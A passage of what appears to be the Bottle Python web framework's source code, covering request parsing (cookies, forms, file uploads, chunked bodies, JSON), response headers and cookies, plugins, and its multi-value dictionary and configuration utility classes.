            HTTP request headers. """
        return WSGIHeaderDict(self.environ)

    def get_header(self, name, default=None):
        """ Return the value of a request header, or a given default value. """
        return self.headers.get(name, default)

    @DictProperty('environ', 'bottle.request.cookies', read_only=True)
    def cookies(self):
        """ Cookies parsed into a :class:`FormsDict`. Signed cookies are NOT
            decoded. Use :meth:`get_cookie` if you expect signed cookies. """
        cookies = SimpleCookie(self.environ.get('HTTP_COOKIE','')).values()
        return FormsDict((c.key, c.value) for c in cookies)

    def get_cookie(self, key, default=None, secret=None):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret and value:
            dec = cookie_decode(value, secret) # (key, value) tuple or None
            return dec[1] if dec and dec[0] == key else default
        return value or default

    @DictProperty('environ', 'bottle.request.query', read_only=True)
    def query(self):
        """ The :attr:`query_string` parsed into a :class:`FormsDict`. These
            values are sometimes called "URL arguments" or "GET parameters", but
            not to be confused with "URL wildcards" as they are provided by the
            :class:`Router`. """
        get = self.environ['bottle.get'] = FormsDict()
        pairs = _parse_qsl(self.environ.get('QUERY_STRING', ''))
        for key, value in pairs:
            get[key] = value
        return get

    @DictProperty('environ', 'bottle.request.forms', read_only=True)
    def forms(self):
        """ Form values parsed from an `url-encoded` or `multipart/form-data`
            encoded POST or PUT request body. The result is returned as a
            :class:`FormsDict`. All keys and values are strings. File uploads
            are stored separately in :attr:`files`. """
        forms = FormsDict()
        for name, item in self.POST.allitems():
            if not isinstance(item, FileUpload):
                forms[name] = item
        return forms

    @DictProperty('environ', 'bottle.request.params', read_only=True)
    def params(self):
        """ A :class:`FormsDict` with the combined values of :attr:`query` and
            :attr:`forms`. File uploads are stored in :attr:`files`. """
        params = FormsDict()
        for key, value in self.query.allitems():
            params[key] = value
        for key, value in self.forms.allitems():
            params[key] = value
        return params

    @DictProperty('environ', 'bottle.request.files', read_only=True)
    def files(self):
        """ File uploads parsed from `multipart/form-data` encoded POST or PUT
            request body. The values are instances of :class:`FileUpload`.

        """
        files = FormsDict()
        for name, item in self.POST.allitems():
            if isinstance(item, FileUpload):
                files[name] = item
        return files

    @DictProperty('environ', 'bottle.request.json', read_only=True)
    def json(self):
        """ If the ``Content-Type`` header is ``application/json``, this
            property holds the parsed content of the request body. Only requests
            smaller than :attr:`MEMFILE_MAX` are processed to avoid memory
            exhaustion. """
        ctype = self.environ.get('CONTENT_TYPE', '').lower().split(';')[0]
        if ctype == 'application/json':
            b = self._get_body_string()
            if not b:
                return None
            return json_loads(b)
        return None

    def _iter_body(self, read, bufsize):
        maxread = max(0, self.content_length)
        while maxread:
            part = read(min(maxread, bufsize))
            if not part: break
            yield part
            maxread -= len(part)

    @staticmethod
    def _iter_chunked(read, bufsize):
        err = HTTPError(400, 'Error while parsing chunked transfer body.')
        rn, sem, bs = tob('\r\n'), tob(';'), tob('')
        while True:
            header = read(1)
            while header[-2:] != rn:
                c = read(1)
                header += c
                if not c: raise err
                if len(header) > bufsize: raise err
            size, _, _ = header.partition(sem)
            try:
                maxread = int(tonat(size.strip()), 16)
            except ValueError:
                raise err
            if maxread == 0: break
            buff = bs
            while maxread > 0:
                if not buff:
                    buff = read(min(maxread, bufsize))
                part, buff = buff[:maxread], buff[maxread:]
                if not part: raise err
                yield part
                maxread -= len(part)
            if read(2) != rn:
                raise err
            
    @DictProperty('environ', 'bottle.request.body', read_only=True)
    def _body(self):
        body_iter = self._iter_chunked if self.chunked else self._iter_body
        read_func = self.environ['wsgi.input'].read
        body, body_size, is_temp_file = BytesIO(), 0, False
        for part in body_iter(read_func, self.MEMFILE_MAX):
            body.write(part)
            body_size += len(part)
            if not is_temp_file and body_size > self.MEMFILE_MAX:
                body, tmp = TemporaryFile(mode='w+b'), body
                body.write(tmp.getvalue())
                del tmp
                is_temp_file = True
        self.environ['wsgi.input'] = body
        body.seek(0)
        return body

    def _get_body_string(self):
        """ read body until content-length or MEMFILE_MAX into a string. Raise
            HTTPError(413) on requests that are to large. """
        clen = self.content_length
        if clen > self.MEMFILE_MAX:
            raise HTTPError(413, 'Request entity too large')
        if clen < 0: clen = self.MEMFILE_MAX + 1
        data = self.body.read(clen)
        if len(data) > self.MEMFILE_MAX: # Fail fast
            raise HTTPError(413, 'Request entity too large')
        return data

    @property
    def body(self):
        """ The HTTP request body as a seek-able file-like object. Depending on
            :attr:`MEMFILE_MAX`, this is either a temporary file or a
            :class:`io.BytesIO` instance. Accessing this property for the first
            time reads and replaces the ``wsgi.input`` environ variable.
            Subsequent accesses just do a `seek(0)` on the file object. """
        self._body.seek(0)
        return self._body

    @property
    def chunked(self):
        """ True if Chunked transfer encoding was. """
        return 'chunked' in self.environ.get('HTTP_TRANSFER_ENCODING', '').lower()

    #: An alias for :attr:`query`.
    GET = query

    @DictProperty('environ', 'bottle.request.post', read_only=True)
    def POST(self):
        """ The values of :attr:`forms` and :attr:`files` combined into a single
            :class:`FormsDict`. Values are either strings (form values) or
            instances of :class:`cgi.FieldStorage` (file uploads).
        """
        post = FormsDict()
        # We default to application/x-www-form-urlencoded for everything that
        # is not multipart and take the fast path (also: 3.1 workaround)
        if not self.content_type.startswith('multipart/'):
            pairs = _parse_qsl(tonat(self._get_body_string(), 'latin1'))
            for key, value in pairs:
                post[key] = value
            return post

        safe_env = {'QUERY_STRING':''} # Build a safe environment for cgi
        for key in ('REQUEST_METHOD', 'CONTENT_TYPE', 'CONTENT_LENGTH'):
            if key in self.environ: safe_env[key] = self.environ[key]
        args = dict(fp=self.body, environ=safe_env, keep_blank_values=True)
        if py31:
            args['fp'] = NCTextIOWrapper(args['fp'], encoding='utf8',
                                         newline='\n')
        elif py3k:
            args['encoding'] = 'utf8'
        data = cgi.FieldStorage(**args)
        self['_cgi.FieldStorage'] = data #http://bugs.python.org/issue18394#msg207958
        data = data.list or []
        for item in data:
            if item.filename:
                post[item.name] = FileUpload(item.file, item.name,
                                             item.filename, item.headers)
            else:
                post[item.name] = item.value
        return post

    @property
    def url(self):
        """ The full request URI including hostname and scheme. If your app
            lives behind a reverse proxy or load balancer and you get confusing
            results, make sure that the ``X-Forwarded-Host`` header is set
            correctly. """
        return self.urlparts.geturl()

    @DictProperty('environ', 'bottle.request.urlparts', read_only=True)
    def urlparts(self):
        """ The :attr:`url` string as an :class:`urlparse.SplitResult` tuple.
            The tuple contains (scheme, host, path, query_string and fragment),
            but the fragment is always empty because it is not visible to the
            server. """
        env = self.environ
        http = env.get('HTTP_X_FORWARDED_PROTO') or env.get('wsgi.url_scheme', 'http')
        host = env.get('HTTP_X_FORWARDED_HOST') or env.get('HTTP_HOST')
        if not host:
            # HTTP 1.1 requires a Host-header. This is for HTTP/1.0 clients.
            host = env.get('SERVER_NAME', '127.0.0.1')
            port = env.get('SERVER_PORT')
            if port and port != ('80' if http == 'http' else '443'):
                host += ':' + port
        path = urlquote(self.fullpath)
        return UrlSplitResult(http, host, path, env.get('QUERY_STRING'), '')

    @property
    def fullpath(self):
        """ Request path including :attr:`script_name` (if present). """
        return urljoin(self.script_name, self.path.lstrip('/'))

    @property
    def query_string(self):
        """ The raw :attr:`query` part of the URL (everything in between ``?``
            and ``#``) as a string. """
        return self.environ.get('QUERY_STRING', '')

    @property
    def script_name(self):
        """ The initial portion of the URL's `path` that was removed by a higher
            level (server or routing middleware) before the application was
            called. This script path is returned with leading and tailing
            slashes. """
        script_name = self.environ.get('SCRIPT_NAME', '').strip('/')
        return '/' + script_name + '/' if script_name else '/'

    def path_shift(self, shift=1):
        """ Shift path segments from :attr:`path` to :attr:`script_name` and
            vice versa.

           :param shift: The number of path segments to shift. May be negative
                         to change the shift direction. (default: 1)
        """
        script = self.environ.get('SCRIPT_NAME','/')
        self['SCRIPT_NAME'], self['PATH_INFO'] = path_shift(script, self.path, shift)

    @property
    def content_length(self):
        """ The request body length as an integer. The client is responsible to
            set this header. Otherwise, the real length of the body is unknown
            and -1 is returned. In this case, :attr:`body` will be empty. """
        return int(self.environ.get('CONTENT_LENGTH') or -1)

    @property
    def content_type(self):
        """ The Content-Type header as a lowercase-string (default: empty). """
        return self.environ.get('CONTENT_TYPE', '').lower()

    @property
    def is_xhr(self):
        """ True if the request was triggered by a XMLHttpRequest. This only
            works with JavaScript libraries that support the `X-Requested-With`
            header (most of the popular libraries do). """
        requested_with = self.environ.get('HTTP_X_REQUESTED_WITH','')
        return requested_with.lower() == 'xmlhttprequest'

    @property
    def is_ajax(self):
        """ Alias for :attr:`is_xhr`. "Ajax" is not the right term. """
        return self.is_xhr

    @property
    def auth(self):
        """ HTTP authentication data as a (user, password) tuple. This
            implementation currently supports basic (not digest) authentication
            only. If the authentication happened at a higher level (e.g. in the
            front web-server or a middleware), the password field is None, but
            the user field is looked up from the ``REMOTE_USER`` environ
            variable. On any errors, None is returned. """
        basic = parse_auth(self.environ.get('HTTP_AUTHORIZATION',''))
        if basic: return basic
        ruser = self.environ.get('REMOTE_USER')
        if ruser: return (ruser, None)
        return None

    @property
    def remote_route(self):
        """ A list of all IPs that were involved in this request, starting with
            the client IP and followed by zero or more proxies. This does only
            work if all proxies support the ```X-Forwarded-For`` header. Note
            that this information can be forged by malicious clients. """
        proxy = self.environ.get('HTTP_X_FORWARDED_FOR')
        if proxy: return [ip.strip() for ip in proxy.split(',')]
        remote = self.environ.get('REMOTE_ADDR')
        return [remote] if remote else []

    @property
    def remote_addr(self):
        """ The client IP as a string. Note that this information can be forged
            by malicious clients. """
        route = self.remote_route
        return route[0] if route else None

    def copy(self):
        """ Return a new :class:`Request` with a shallow :attr:`environ` copy. """
        return Request(self.environ.copy())

    def get(self, value, default=None): return self.environ.get(value, default)
    def __getitem__(self, key): return self.environ[key]
    def __delitem__(self, key): self[key] = ""; del(self.environ[key])
    def __iter__(self): return iter(self.environ)
    def __len__(self): return len(self.environ)
    def keys(self): return self.environ.keys()
    def __setitem__(self, key, value):
        """ Change an environ value and clear all caches that depend on it. """

        if self.environ.get('bottle.request.readonly'):
            raise KeyError('The environ dictionary is read-only.')

        self.environ[key] = value
        todelete = ()

        if key == 'wsgi.input':
            todelete = ('body', 'forms', 'files', 'params', 'post', 'json')
        elif key == 'QUERY_STRING':
            todelete = ('query', 'params')
        elif key.startswith('HTTP_'):
            todelete = ('headers', 'cookies')

        for key in todelete:
            self.environ.pop('bottle.request.'+key, None)

    def __repr__(self):
        return '<%s: %s %s>' % (self.__class__.__name__, self.method, self.url)

    def __getattr__(self, name):
        """ Search in self.environ for additional user defined attributes. """
        try:
            var = self.environ['bottle.request.ext.%s'%name]
            return var.__get__(self) if hasattr(var, '__get__') else var
        except KeyError:
            raise AttributeError('Attribute %r not defined.' % name)

    def __setattr__(self, name, value):
        if name == 'environ': return object.__setattr__(self, name, value)
        self.environ['bottle.request.ext.%s'%name] = value




def _hkey(s):
    return s.title().replace('_','-')


class HeaderProperty(object):
    def __init__(self, name, reader=None, writer=str, default=''):
        self.name, self.default = name, default
        self.reader, self.writer = reader, writer
        self.__doc__ = 'Current value of the %r header.' % name.title()

    def __get__(self, obj, _):
        if obj is None: return self
        value = obj.headers.get(self.name, self.default)
        return self.reader(value) if self.reader else value

    def __set__(self, obj, value):
        obj.headers[self.name] = self.writer(value)

    def __delete__(self, obj):
        del obj.headers[self.name]


class BaseResponse(object):
    """ Storage class for a response body as well as headers and cookies.

        This class does support dict-like case-insensitive item-access to
        headers, but is NOT a dict. Most notably, iterating over a response
        yields parts of the body and not the headers.

        :param body: The response body as one of the supported types.
        :param status: Either an HTTP status code (e.g. 200) or a status line
                       including the reason phrase (e.g. '200 OK').
        :param headers: A dictionary or a list of name-value pairs.

        Additional keyword arguments are added to the list of headers.
        Underscores in the header name are replaced with dashes.
    """

    default_status = 200
    default_content_type = 'text/html; charset=UTF-8'

    # Header blacklist for specific response codes
    # (rfc2616 section 10.2.3 and 10.3.5)
    bad_headers = {
        204: set(('Content-Type',)),
        304: set(('Allow', 'Content-Encoding', 'Content-Language',
                  'Content-Length', 'Content-Range', 'Content-Type',
                  'Content-Md5', 'Last-Modified'))}

    def __init__(self, body='', status=None, headers=None, **more_headers):
        self._cookies = None
        self._headers = {}
        self.body = body
        self.status = status or self.default_status
        if headers:
            if isinstance(headers, dict):
                headers = headers.items()
            for name, value in headers:
                self.add_header(name, value)
        if more_headers:
            for name, value in more_headers.items():
                self.add_header(name, value)

    def copy(self, cls=None):
        """ Returns a copy of self. """
        cls = cls or BaseResponse
        assert issubclass(cls, BaseResponse)
        copy = cls()
        copy.status = self.status
        copy._headers = dict((k, v[:]) for (k, v) in self._headers.items())
        if self._cookies:
            copy._cookies = SimpleCookie()
            copy._cookies.load(self._cookies.output(header=''))
        return copy

    def __iter__(self):
        return iter(self.body)

    def close(self):
        if hasattr(self.body, 'close'):
            self.body.close()

    @property
    def status_line(self):
        """ The HTTP status line as a string (e.g. ``404 Not Found``)."""
        return self._status_line

    @property
    def status_code(self):
        """ The HTTP status code as an integer (e.g. 404)."""
        return self._status_code

    def _set_status(self, status):
        if isinstance(status, int):
            code, status = status, _HTTP_STATUS_LINES.get(status)
        elif ' ' in status:
            status = status.strip()
            code   = int(status.split()[0])
        else:
            raise ValueError('String status line without a reason phrase.')
        if not 100 <= code <= 999: raise ValueError('Status code out of range.')
        self._status_code = code
        self._status_line = str(status or ('%d Unknown' % code))

    def _get_status(self):
        return self._status_line

    status = property(_get_status, _set_status, None,
        ''' A writeable property to change the HTTP response status. It accepts
            either a numeric code (100-999) or a string with a custom reason
            phrase (e.g. "404 Brain not found"). Both :data:`status_line` and
            :data:`status_code` are updated accordingly. The return value is
            always a status string. ''')
    del _get_status, _set_status

    @property
    def headers(self):
        """ An instance of :class:`HeaderDict`, a case-insensitive dict-like
            view on the response headers. """
        hdict = HeaderDict()
        hdict.dict = self._headers
        return hdict

    def __contains__(self, name): return _hkey(name) in self._headers
    def __delitem__(self, name):  del self._headers[_hkey(name)]
    def __getitem__(self, name):  return self._headers[_hkey(name)][-1]
    def __setitem__(self, name, value): self._headers[_hkey(name)] = [value if isinstance(value, unicode) else str(value)]

    def get_header(self, name, default=None):
        """ Return the value of a previously defined header. If there is no
            header with that name, return a default value. """
        return self._headers.get(_hkey(name), [default])[-1]

    def set_header(self, name, value):
        """ Create a new response header, replacing any previously defined
            headers with the same name. """
        self._headers[_hkey(name)] = [value if isinstance(value, unicode) else str(value)]

    def add_header(self, name, value):
        """ Add an additional response header, not removing duplicates. """
        self._headers.setdefault(_hkey(name), []).append(value if isinstance(value, unicode) else str(value))

    def iter_headers(self):
        """ Yield (header, value) tuples, skipping headers that are not
            allowed with the current response status code. """
        return self.headerlist

    @property
    def headerlist(self):
        """ WSGI conform list of (header, value) tuples. """
        out = []
        headers = list(self._headers.items())
        if 'Content-Type' not in self._headers:
            headers.append(('Content-Type', [self.default_content_type]))
        if self._status_code in self.bad_headers:
            bad_headers = self.bad_headers[self._status_code]
            headers = [h for h in headers if h[0] not in bad_headers]
        out += [(name, val) for (name, vals) in headers for val in vals]
        if self._cookies:
            for c in self._cookies.values():
                out.append(('Set-Cookie', c.OutputString()))
        if py3k:
            return [(k, v.encode('utf8').decode('latin1')) for (k, v) in out]
        else:
            return [(k, v.encode('utf8') if isinstance(v, unicode) else v) for (k, v) in out]

    content_type = HeaderProperty('Content-Type')
    content_length = HeaderProperty('Content-Length', reader=int)
    expires = HeaderProperty('Expires',
        reader=lambda x: datetime.utcfromtimestamp(parse_date(x)),
        writer=lambda x: http_date(x))

    @property
    def charset(self, default='UTF-8'):
        """ Return the charset specified in the content-type header (default: utf8). """
        if 'charset=' in self.content_type:
            return self.content_type.split('charset=')[-1].split(';')[0].strip()
        return default

    def set_cookie(self, name, value, secret=None, **options):
        """ Create a new cookie or replace an old one. If the `secret` parameter is
            set, create a `Signed Cookie` (described below).

            :param name: the name of the cookie.
            :param value: the value of the cookie.
            :param secret: a signature key required for signed cookies.

            Additionally, this method accepts all RFC 2109 attributes that are
            supported by :class:`cookie.Morsel`, including:

            :param max_age: maximum age in seconds. (default: None)
            :param expires: a datetime object or UNIX timestamp. (default: None)
            :param domain: the domain that is allowed to read the cookie.
              (default: current domain)
            :param path: limits the cookie to a given path (default: current path)
            :param secure: limit the cookie to HTTPS connections (default: off).
            :param httponly: prevents client-side javascript to read this cookie
              (default: off, requires Python 2.6 or newer).

            If neither `expires` nor `max_age` is set (default), the cookie will
            expire at the end of the browser session (as soon as the browser
            window is closed).

            Signed cookies may store any pickle-able object and are
            cryptographically signed to prevent manipulation. Keep in mind that
            cookies are limited to 4kb in most browsers.

            Warning: Signed cookies are not encrypted (the client can still see
            the content) and not copy-protected (the client can restore an old
            cookie). The main intention is to make pickling and unpickling
            save, not to store secret information at client side.
        """
        if not self._cookies:
            self._cookies = SimpleCookie()

        if secret:
            value = touni(cookie_encode((name, value), secret))
        elif not isinstance(value, basestring):
            raise TypeError('Secret key missing for non-string Cookie.')

        if len(value) > 4096: raise ValueError('Cookie value to long.')
        self._cookies[name] = value

        for key, value in options.items():
            if key == 'max_age':
                if isinstance(value, timedelta):
                    value = value.seconds + value.days * 24 * 3600
            if key == 'expires':
                if isinstance(value, (datedate, datetime)):
                    value = value.timetuple()
                elif isinstance(value, (int, float)):
                    value = time.gmtime(value)
                value = time.strftime("%a, %d %b %Y %H:%M:%S GMT", value)
            self._cookies[name][key.replace('_', '-')] = value

    def delete_cookie(self, key, **kwargs):
        """ Delete a cookie. Be sure to use the same `domain` and `path`
            settings as used to create the cookie. """
        kwargs['max_age'] = -1
        kwargs['expires'] = 0
        self.set_cookie(key, '', **kwargs)

    def __repr__(self):
        out = ''
        for name, value in self.headerlist:
            out += '%s: %s\n' % (name.title(), value.strip())
        return out


def _local_property():
    ls = threading.local()
    def fget(_):
        try: return ls.var
        except AttributeError:
            raise RuntimeError("Request context not initialized.")
    def fset(_, value): ls.var = value
    def fdel(_): del ls.var
    return property(fget, fset, fdel, 'Thread-local property')


class LocalRequest(BaseRequest):
    """ A thread-local subclass of :class:`BaseRequest` with a different
        set of attributes for each thread. There is usually only one global
        instance of this class (:data:`request`). If accessed during a
        request/response cycle, this instance always refers to the *current*
        request (even on a multithreaded server). """
    bind = BaseRequest.__init__
    environ = _local_property()


class LocalResponse(BaseResponse):
    """ A thread-local subclass of :class:`BaseResponse` with a different
        set of attributes for each thread. There is usually only one global
        instance of this class (:data:`response`). Its attributes are used
        to build the HTTP response at the end of the request/response cycle.
    """
    bind = BaseResponse.__init__
    _status_line = _local_property()
    _status_code = _local_property()
    _cookies     = _local_property()
    _headers     = _local_property()
    body         = _local_property()


Request = BaseRequest
Response = BaseResponse


class HTTPResponse(Response, BottleException):
    def __init__(self, body='', status=None, headers=None, **more_headers):
        super(HTTPResponse, self).__init__(body, status, headers, **more_headers)

    def apply(self, other):
        other._status_code = self._status_code
        other._status_line = self._status_line
        other._headers = self._headers
        other._cookies = self._cookies
        other.body = self.body


class HTTPError(HTTPResponse):
    default_status = 500
    def __init__(self, status=None, body=None, exception=None, traceback=None,
                 **options):
        self.exception = exception
        self.traceback = traceback
        super(HTTPError, self).__init__(body, status, **options)





###############################################################################
# Plugins ######################################################################
###############################################################################

class PluginError(BottleException): pass


class JSONPlugin(object):
    name = 'json'
    api  = 2

    def __init__(self, json_dumps=json_dumps):
        self.json_dumps = json_dumps

    def apply(self, callback, _):
        dumps = self.json_dumps
        if not dumps: return callback
        def wrapper(*a, **ka):
            try:
                rv = callback(*a, **ka)
            except HTTPError:
                rv = _e()

            if isinstance(rv, dict):
                #Attempt to serialize, raises exception on failure
                json_response = dumps(rv)
                #Set content type only if serialization successful
                response.content_type = 'application/json'
                return json_response
            elif isinstance(rv, HTTPResponse) and isinstance(rv.body, dict):
                rv.body = dumps(rv.body)
                rv.content_type = 'application/json'
            return rv

        return wrapper


class TemplatePlugin(object):
    """ This plugin applies the :func:`view` decorator to all routes with a
        `template` config parameter. If the parameter is a tuple, the second
        element must be a dict with additional options (e.g. `template_engine`)
        or default variables for the template. """
    name = 'template'
    api  = 2

    def apply(self, callback, route):
        conf = route.config.get('template')
        if isinstance(conf, (tuple, list)) and len(conf) == 2:
            return view(conf[0], **conf[1])(callback)
        elif isinstance(conf, str):
            return view(conf)(callback)
        else:
            return callback


#: Not a plugin, but part of the plugin API. TODO: Find a better place.
class _ImportRedirect(object):
    def __init__(self, name, impmask):
        """ Create a virtual package that redirects imports (see PEP 302). """
        self.name = name
        self.impmask = impmask
        self.module = sys.modules.setdefault(name, imp.new_module(name))
        self.module.__dict__.update({'__file__': __file__, '__path__': [],
                                    '__all__': [], '__loader__': self})
        sys.meta_path.append(self)

    def find_module(self, fullname, path=None):
        if '.' not in fullname: return
        packname = fullname.rsplit('.', 1)[0]
        if packname != self.name: return
        return self

    def load_module(self, fullname):
        if fullname in sys.modules: return sys.modules[fullname]
        modname = fullname.rsplit('.', 1)[1]
        realname = self.impmask % modname
        __import__(realname)
        module = sys.modules[fullname] = sys.modules[realname]
        setattr(self.module, modname, module)
        module.__loader__ = self
        return module






###############################################################################
# Common Utilities #############################################################
###############################################################################


class MultiDict(DictMixin):
    """ This dict stores multiple values per key, but behaves exactly like a
        normal dict in that it returns only the newest value for any given key.
        There are special methods available to access the full list of values.
    """

    def __init__(self, *a, **k):
        self.dict = dict((k, [v]) for (k, v) in dict(*a, **k).items())

    def __len__(self): return len(self.dict)
    def __iter__(self): return iter(self.dict)
    def __contains__(self, key): return key in self.dict
    def __delitem__(self, key): del self.dict[key]
    def __getitem__(self, key): return self.dict[key][-1]
    def __setitem__(self, key, value): self.append(key, value)
    def keys(self): return self.dict.keys()

    if py3k:
        def values(self): return (v[-1] for v in self.dict.values())
        def items(self): return ((k, v[-1]) for k, v in self.dict.items())
        def allitems(self):
            return ((k, v) for k, vl in self.dict.items() for v in vl)
        iterkeys = keys
        itervalues = values
        iteritems = items
        iterallitems = allitems

    else:
        def values(self): return [v[-1] for v in self.dict.values()]
        def items(self): return [(k, v[-1]) for k, v in self.dict.items()]
        def iterkeys(self): return self.dict.iterkeys()
        def itervalues(self): return (v[-1] for v in self.dict.itervalues())
        def iteritems(self):
            return ((k, v[-1]) for k, v in self.dict.iteritems())
        def iterallitems(self):
            return ((k, v) for k, vl in self.dict.iteritems() for v in vl)
        def allitems(self):
            return [(k, v) for k, vl in self.dict.iteritems() for v in vl]

    def get(self, key, default=None, index=-1, type=None):
        """ Return the most recent value for a key.

            :param default: The default value to be returned if the key is not
                   present or the type conversion fails.
            :param index: An index for the list of available values.
            :param type: If defined, this callable is used to cast the value
                    into a specific type. Exception are suppressed and result in
                    the default value to be returned.
        """
        try:
            val = self.dict[key][index]
            return type(val) if type else val
        except Exception:
            pass
        return default

    def append(self, key, value):
        """ Add a new value to the list of values for this key. """
        self.dict.setdefault(key, []).append(value)

    def replace(self, key, value):
        """ Replace the list of values with a single value. """
        self.dict[key] = [value]

    def getall(self, key):
        """ Return a (possibly empty) list of values for a key. """
        return self.dict.get(key) or []

    #: Aliases for WTForms to mimic other multi-dict APIs (Django)
    getone = get
    getlist = getall


class FormsDict(MultiDict):
    """ This :class:`MultiDict` subclass is used to store request form data.
        Additionally to the normal dict-like item access methods (which return
        unmodified data as native strings), this container also supports
        attribute-like access to its values. Attributes are automatically de-
        or recoded to match :attr:`input_encoding` (default: 'utf8'). Missing
        attributes default to an empty string. """

    #: Encoding used for attribute values.
    input_encoding = 'utf8'
    #: If true (default), unicode strings are first encoded with `latin1`
    #: and then decoded to match :attr:`input_encoding`.
    recode_unicode = True

    def _fix(self, s, encoding=None):
        if isinstance(s, unicode) and self.recode_unicode: # Python 3 WSGI
            return s.encode('latin1').decode(encoding or self.input_encoding)
        elif isinstance(s, bytes): # Python 2 WSGI
            return s.decode(encoding or self.input_encoding)
        else:
            return s

    def decode(self, encoding=None):
        """ Returns a copy with all keys and values de- or recoded to match
            :attr:`input_encoding`. Some libraries (e.g. WTForms) want a
            unicode dictionary. """
        copy = FormsDict()
        enc = copy.input_encoding = encoding or self.input_encoding
        copy.recode_unicode = False
        for key, value in self.allitems():
            copy.append(self._fix(key, enc), self._fix(value, enc))
        return copy

    def getunicode(self, name, default=None, encoding=None):
        """ Return the value as a unicode string, or the default. """
        try:
            return self._fix(self[name], encoding)
        except (UnicodeError, KeyError):
            return default

    def __getattr__(self, name, default=unicode()):
        # Without this guard, pickle generates a cryptic TypeError:
        if name.startswith('__') and name.endswith('__'):
            return super(FormsDict, self).__getattr__(name)
        return self.getunicode(name, default=default)


class HeaderDict(MultiDict):
    """ A case-insensitive version of :class:`MultiDict` that defaults to
        replace the old value instead of appending it. """

    def __init__(self, *a, **ka):
        self.dict = {}
        if a or ka: self.update(*a, **ka)

    def __contains__(self, key): return _hkey(key) in self.dict
    def __delitem__(self, key): del self.dict[_hkey(key)]
    def __getitem__(self, key): return self.dict[_hkey(key)][-1]
    def __setitem__(self, key, value): self.dict[_hkey(key)] = [value if isinstance(value, unicode) else str(value)]
    def append(self, key, value):
        self.dict.setdefault(_hkey(key), []).append(value if isinstance(value, unicode) else str(value))
    def replace(self, key, value): self.dict[_hkey(key)] = [value if isinstance(value, unicode) else str(value)]
    def getall(self, key): return self.dict.get(_hkey(key)) or []
    def get(self, key, default=None, index=-1):
        return MultiDict.get(self, _hkey(key), default, index)
    def filter(self, names):
        for name in [_hkey(n) for n in names]:
            if name in self.dict:
                del self.dict[name]


class WSGIHeaderDict(DictMixin):
    """ This dict-like class wraps a WSGI environ dict and provides convenient
        access to HTTP_* fields. Keys and values are native strings
        (2.x bytes or 3.x unicode) and keys are case-insensitive. If the WSGI
        environment contains non-native string values, these are de- or encoded
        using a lossless 'latin1' character set.

        The API will remain stable even on changes to the relevant PEPs.
        Currently PEP 333, 444 and 3333 are supported. (PEP 444 is the only one
        that uses non-native strings.)
    """
    #: List of keys that do not have a ``HTTP_`` prefix.
    cgikeys = ('CONTENT_TYPE', 'CONTENT_LENGTH')

    def __init__(self, environ):
        self.environ = environ

    def _ekey(self, key):
        """ Translate header field name to CGI/WSGI environ key. """
        key = key.replace('-','_').upper()
        if key in self.cgikeys:
            return key
        return 'HTTP_' + key

    def raw(self, key, default=None):
        """ Return the header value as is (may be bytes or unicode). """
        return self.environ.get(self._ekey(key), default)

    def __getitem__(self, key):
        val = self.environ[self._ekey(key)]
        if py3k:
            if isinstance(val, unicode):
                val = val.encode('latin1').decode('utf8')
            else:
                val = val.decode('utf8')
        return val

    def __setitem__(self, key, value):
        raise TypeError("%s is read-only." % self.__class__)

    def __delitem__(self, key):
        raise TypeError("%s is read-only." % self.__class__)

    def __iter__(self):
        for key in self.environ:
            if key[:5] == 'HTTP_':
                yield _hkey(key[5:])
            elif key in self.cgikeys:
                yield _hkey(key)

    def keys(self): return [x for x in self]
    def __len__(self): return len(self.keys())
    def __contains__(self, key): return self._ekey(key) in self.environ



class ConfigDict(dict):
    """ A dict-like configuration storage with additional support for
        namespaces, validators, meta-data, on_change listeners and more.
    """

    __slots__ = ('_meta', '_on_change')

    def __init__(self):
        self._meta = {}
        self._on_change = lambda name, value: None

    def load_config(self, filename):
        """ Load values from an ``*.ini`` style config file.

            If the config file contains sections, their names are used as
            namespaces for the values within. The two special sections
            ``DEFAULT`` and ``bottle`` refer to the root namespace (no prefix).
        """
        conf = ConfigParser()
        conf.read(filename)
        for section in conf.sections():
            for key, value in conf.items(section):
                if section not in ('DEFAULT', 'bottle'):
                    key = section + '.' + key
                self[key] = value
        return self

    def load_dict(self, source, namespace=''):
        """ Load values from a dictionary structure. Nesting can be used to
            represent namespaces.

            >>> c = ConfigDict()
            >>> c.load_dict({'some': {'namespace': {'key': 'value'} } })
            {'some.namespace.key': 'value'}
        """
        for key, value in source.items():
            if isinstance(key, str):
                nskey = (namespace + '.' + key).strip('.')
                if isinstance(value, dict):
                    self.load_dict(value, namespace=nskey)
                else:
                    self[nskey] = value
            else:
                raise TypeError('Key has type %r (not a string)' % type(key))
        return self

    def update(self, *a, **ka):
        """ If the first parameter is a string, all keys are prefixed with this
            namespace. Apart from that it works just as the usual dict.update().
            Example: ``update('some.namespace', key='value')`` """
        prefix = ''
        if a and isinstance(a[0], str):
            prefix = a[0].strip('.') + '.'
            a = a[1:]
        for key, value in dict(*a, **ka).items():
            self[prefix+key] = value

    def setdefault(self, key, value):
        if key not in self:
            self[key] = value
        return self[key]

    def __setitem__(self, key, value):
        if not isinstance(key, str):
            raise TypeError('Key has type %r (not a string)' % type(key))
        value = self.meta_get(key, 'filter', lambda x: x)(value)
        if key in self and self[key] is value:
            return
        self._on_change(key, value)
        dict.__setitem__(self, key, value)

    def __delitem__(self, key):
        self._on_change(key, None)
        dict.__delitem__(self, key)

    def meta_get(self, key, metafield, default=None):
        """ Return the value of a meta field for a key. """
        return self._meta.get(key, {}).get(metafield, default)

    def meta_set(self, key, metafield, value):
        """ Set the meta field for a key to a new value. This triggers the
            on-change handler for existing keys. """
        self._meta.setdefault(key, {})[metafield] = value
        if key in self:
            self[key] = self[key]

    def meta_list(self, key):
        """ Return an iterable of meta field names defined for a key. """
        return self._meta.get(key, {}).keys()


class AppStack(list):
    """ A stack-like list. Calling it returns the head of the stack. """

    def __call__(self):
        """ Return the current default application. """
        return self[-1]

    def push(self, value=None):
        """ Add a new :class:`Bottle` instance to the stack """
        if not isinstance(value, Bottle):
            value = Bottle()
        self.append(value)
        return value


class WSGIFileWrapper(object):

    def __init__(self, fp, buffer_size=1024*64):
        self.fp, self.buffer_size = fp, buffer_size
        for attr in ('fileno', 'close', 'read', 'readlines', 'tell', 'seek'):
            if hasattr(fp, attr): setattr(self, attr, getattr(fp, attr))

    def __iter__(self):
        buff, read = self.buffer_size, self.read
        while True:
            part = read(buff)
